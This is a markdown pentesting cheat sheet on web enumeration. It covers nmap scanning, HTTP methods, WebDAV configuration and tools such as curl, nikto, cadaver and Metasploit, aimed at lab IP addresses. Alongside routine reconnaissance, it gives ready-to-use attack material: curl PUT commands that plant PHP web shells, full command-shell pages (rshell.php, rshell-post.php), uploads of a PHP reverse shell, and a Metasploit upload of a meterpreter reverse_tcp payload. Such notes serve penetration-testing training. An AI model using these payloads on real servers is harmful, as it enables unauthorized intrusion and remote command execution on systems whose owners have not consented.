## Web Enumeration
Web enumeration means to look out info about services running on port, versions, languages, directories and more.
- [Web Enumeration](#web-enumeration)
  - [Ports](#ports) 
  - [nmap](#nmap)
  - [Finding Open Ports](#finding-open-ports)
  - [Checking Running Service Version](#check-running-service-version)
  - [Nmap Scripts](obtaining-information-using-nmap-scripts)
- [HTTP Method](#http-method)
  - [Available Methods](#detecting-available-methods)
  - [Upload File](#upload-file)
  - [Tools](#tools)
    - [netcat](#netcat)
    - [curl](#curl)
    - [nikto](#nikto)
    - [davtest](#davtest)
    - [cadaver](#cadaver)
- [HTTP Basic Authentication](#http-basic-authentication)
  - [Tools](#tools)
    - [hydra](#hydra)
    - [ncrak](#ncrack)
    - [medusa](#medusa)
   
## ports.
| Service | Port No. | Protocol |
|---------|----------|----------|
| HTTP | 80,8080,8081,8000 | TCP |
| HTTPS | 443,8443,4443 | TCP |
| Tomcat Startup | 8080 | TCP |
| Tomcat Startup (SSL) | 8443 | TCP |
| Tomcat Shutdown | 8005 | TCP |
| Tomcat AJP Connector | 8009 | TCP |
| Glassfish HTTP | 8080 | TCP |
| Glassfish HTTPS | 8181 | TCP |
| Glassfish Admin Server | 4848 | TCP |
| Jetty | 8080 | TCP |
| Jonas Admin Console | 9000 | TCP |
## nmap
	  -Pn: Treat all hosts as online -- skip host discovery
	  -sS/sT/sA/sW/sM: TCP SYN/Connect()/ACK/Window/Maimon scans
	  -p <port ranges>: Only scan specified ports
	  -sV: Probe open ports to determine service/version info
	  -sC: equivalent to --script=default
	  --script=<Lua scripts>: <Lua scripts> is a comma separated list of
		   directories, script-files or script-categories
	  -O: Enable OS detection
	  -oA <basename>: Output in the three major formats at once
	  -v: Increase verbosity level (use -vv or more for greater effect)
	  -A: Enable OS detection, version detection, script scanning, and traceroute
## Finding Open Ports

	# nmap -sT -v -p- $IP
	# nmap -sT -v -p- -oA allports $IP 			##Save Output in File

	# nmap -Pn -sT -v -p- $IP
	
## Check Running Service Version
	# nmap -sT -sV -sC -A -O -v -p 80,443 $IP
	# nmap -Pn -sT -sV -sC -A -O -v -p 80,443 $IP


## Obtaining Information using nmap Scripts
	# ls /usr/share/nmap/scripts/ | grep http
	# nmap -sT -sV -v -p 80,443 --script=http-enum.nse $IP
	# nmap -sT -sV -v -p 80,443 --script=http-php-version.nse $IP
	# nmap -sT -sV -v -p 80,443 --script=http-put.nse $IP
	# nmap -v  -Pn -sT -sV -p 80 --script=http-put.nse --script-args="http-put.url='/test/shell.php',http-put.file='/tmp/shell.php'" $IP
	# nmap -sT -sV -v -p 80,443 --script=http-shellshock.nse $IP
	# nmap -sT -sV -v -p 80,443 --script=http-slowloris.nse $IP
	# nmap -sT -sV -v -p 80,443 --script=http-vhosts.nse $IP
## HTTP Method
| Method | Syntax | Description |
|--------|--------|-------------|
| GET | GET /index.html |GET method requests a representation of the specified resource. Requests using GET should only retrieve data. |
| HEAD | HEAD /index.html |HEAD method requests the headers that would be returned if the HEAD request's URL was instead requested with the HTTP GET method.  |
| POST | POST /test |POST method is used to submit an entity to the specified resource, often causing a change in state or side effects on the server. |
| PUT | PUT /new.html HTTP/1.1 | The PUT method replaces all current representations of the target resource with the request payload. |
| DELETE | DELETE /file.html HTTP/1.1 |DELETE request method deletes the specified resource. |
| CONNECT | CONNECT www.example.com:443 HTTP/1.1 |CONNECT method starts two-way communications with the requested resource. It can be used to open a tunnel. |
| OPTIONS | OPTIONS /index.html HTTP/1.1 |OPTIONS method requests permitted communication options for a given URL or server. A client can specify a URL with this method, or an asterisk (*) to refer to the entire server. |
| TRACE | TRACE /index.html |TRACE method performs a message loop-back test along the path to the target resource, providing a useful debugging mechanism. |
| PATCH | PATCH /file.txt HTTP/1.1 |PATCH request method applies partial modifications to a resource. |
## Detecting Available Methods 
	# nmap -sT -sV -v -p 80,443 --script=http-methods.nse $IP
	# nmap -sT -sV -v -p 80,443 --script=http-method-tamper.nse $IP
## Upload File
	# nmap -p 80 --script http-methods --script-args http-methods.url-path='/index.php' $IP
	# nmap -p 80 --script http-methods --script-args http-method.test-all ='/192.168.1.100' 192.168.1.100
	
	# nmap -p 80 192.168.1.100 --script http-put --script-args http-put.url='/dav/test.php',http-put.file='/dev/shm/test.php'
	
## webdev
	# curl -v -X OPTIONS http://192.168.0.106/webdav/

	# curl -i -k -X OPTIONS http://192.168.0.106/webdav/

	# nmap -v -sT -sV -A -O -p 80 --script-http-methods.nse --script-args http-methods.url-path='/webdav/ 192.168.0.106

	# curl -X PUT -d "hi" http://192.168.0.106/webdav/1.txt

	# curl -v -u dev:123 -X OPTIONS  http://192.168.0.106/test/

	# curl -u dev:123 -X PUT -d "hi"  http://192.168.0.106/test/1.txt
	
## Configuration on Apache Webdev
		
	# vim /etc/httpd/conf/httpd.conf


			
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	<VirtualHost *:80>
		DocumentRoot /var/www/html/webdav/
		   Alias /webdav /var/www/html/webdav
		<Directory /var/www/html/webdav>
		    DAV On
		</Directory>
	</VirtualHost>
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


	Basic Authentiction
			# httpasswd /etc/httpd/.httpasswd admin


	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	<VirtualHost *:80>

		DocumentRoot /var/www/html/webdav/
		<Directory /var/www/html/webdav>
		    DAV On
		    AuthType Basic
		    AuthName "webdav"
		    AuthUserFile /etc/httpd/.htpasswd
		    Require valid-user
		</Directory>
	</VirtualHost>
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

## Tools:

## curl
	# curl -X GET 192.168.1.100
	# curl -X OPTIONS 192.168.1.100
	# curl -X OPTIONS 192.168.1.100/webdev -v
	# curl -X POST 192.168.1.100
	# curl -X PUT 192.168.1.100/uploads
	# curl -X DELETE 192.168.1.100
	# curl 192.168.1.100/uploads --upload-file demo.txt
	# curl -I 192.168.1.100
	# curl -T 1.txt http://192.168.0.105/test

	# curl -T php-reverse-shell.php http://192.168.0.105/test

	# curl -X PUT -T "php-reverse-shell.php" http://192.168.0.105/test

	# curl --upload-file php-reverse-shell.php http://192.168.0.105/test

	# curl -X PUT --upload-file "php-reverse-shell.php" http://192.168.0.105/test

	# curl -X PUT -d "hi" http://192.168.0.105/test/demo.txt
		
	# curl -X PUT -d "<?php phpinf(); ?>" http://192.168.0.105/test/phpinfo.php
		
	# curl --request PUT --url http://192.168.0.105/test/demo.txt --header 'content-type: application/x-www-form-urlencoded' --data 'Demo'  
		
	# curl -X PUT -d '<?php system($_GET["cmd"]);?>' http://192.168.0.105/test/rshell.php
		
	# cat /usr/share/webshells/php/simple-backdoor.php
		
	# curl --request PUT --url http://192.168.0.105/test/rshell.php --header 'content-type: application/x-www-form-urlencoded' --data '<?php if(isset($_REQUEST['cmd'])){echo "<pre>";$cmd = ($_REQUEST['cmd']);system($cmd);echo "</pre>";die;}?>'
		
#### rshell.php
		
				
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
<?php if(isset($_REQUEST['cmd'])){echo "<pre>";$cmd = ($_REQUEST['cmd']);system($cmd);echo "</pre>";die;}?>
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

		
	# curl --request PUT --url http://192.168.0.105/test/rshell.php  --header 'content-type: application/x-www-form-urlencoded' --data '<!doctypehtml><html><head><title> CMD Shell with POST </title></head><body><form action="<?php echo $_SERVER['PHP_SELF'];?>" method="get">CMD:<br> <input name="cmd" type="text"> <br><input name="submit" type="submit" value="cmd"> <br></form><?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd= ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; } ?></body></html>'

#### rshell-post.php
		
	# curl --request PUT --url http://192.168.0.105/test/rshell.php  --header 'content-type: application/x-www-form-urlencoded' --data '<!doctypehtml><html><head><title> CMD Shell with POST </title></head><body><form action="<?php echo $_SERVER['PHP_SELF'];?>" method="post">CMD:<br> <input name="cmd" type="text"> <br><input name="submit" type="submit" value="cmd"> <br></form><?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd= ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; } ?></body></html>'
			
				
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
<!doctypehtml><html><head><title> CMD Shell with POST </title></head><body><form action="<?php echo $_SERVER['PHP_SELF'];?>" method="post">CMD:<br> <input name="cmd" type="text"> <br><input name="submit" type="submit" value="cmd"> <br></form><?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd= ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; } ?></body></html>
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
		
				
#### file_upload.php
					 
		<!doctypehtml><html><head><title>Form - Fileupload</title></head><body><form action="fileupload.php"enctype="multipart/form-data"method="post">Select File to Upload:<br><input name="filetoupload"type="file"><br><input name="submit"type="submit"value="Upload"><br></form><?php if(isset($_POST['submit'])){$file_name=$_FILES["filetoupload"]["name"];$file_type=$_FILES["filetoupload"]["type"];$file_tmp_name=$_FILES["filetoupload"]["tmp_name"];$file_error=$_FILES["filetoupload"]["error"];$file_size=$_FILES["filetoupload"]["size"];echo"File Name = {$file_name} <br />";echo"File Type = {$file_type} <br />";echo"File Tmp Name = {$file_tmp_name}<br />";echo"File Error = {$file_error} <br />";echo"File Size = {$file_size} <br />";if(move_uploaded_file($file_tmp_name,$file_name)){echo "File Uploaded Successfully";}else{echo "Could not Upload file";}}else{echo "Form was not submitted <br />";} ?></body></html>
		
## nikto

		# nikto -h

		# nikto -H
				
		# nikto -Help

		# nikto -Version

		# nikto -update

		# nikto -list-plugins

		# nikto -h http://192.168.0.106/

		# nikto -h 192.168.0.106

		# nikto -C all -h 192.168.0.106 -port 80

		# nikto -Cgidirs all -h 192.168.0.106 -port 80

		# vim target_IP.txt 

						
		~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
		192.168.0.1
		192.168.0.105
		192.168.0.100
		192.168.0.106
		192.168.0.102
		192.168.0.6
		~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


		# nikto -h target_IP.txt 

		# nikto -Cgidirs all -h 192.168.0.106 -port 80 -Display v

		# nikto -Cgidirs all -h 192.168.0.106 -port 80

		# nikto -Cgidirs all -h 192.168.0.106:80

		# nikto -Cgidirs all -h 192.168.0.106 -port 80 -nolookup -nossl

		# nikto -h http://192.168.0.106/cgi-bin

		# nikto -Plugins shellshock -h http://192.168.0.106/

		# nikto -Tuning 1 -h 192.168.0.106:80
## cadaver
	# apt install cadaver

	# yum install cadaver

	# cadaver http://192.168.0.106/webdav/

	dav:/webdav/> ?

	dav:/webdav/> Is

	dav:/webdav/> put network.png

	dav:/webdav/> mkdir new-dir
	
	# msfconsole
		msf> use auxiliary/scanner/http/http_put
		msf>auxiliary (http_put) > set rhosts 192.168.1.100
		msf>auxiliary (http_put) > set payload php/meterpreter/reverse_tcp
		msf>auxiliary (http_put) > set path /dav/
		msf>auxiliary (http_put) > set filename meter.php
		msf>auxiliary (http_put) > set filedata file://root/Desktop/meter.php
		msf>auxiliary (http_put) > exploit
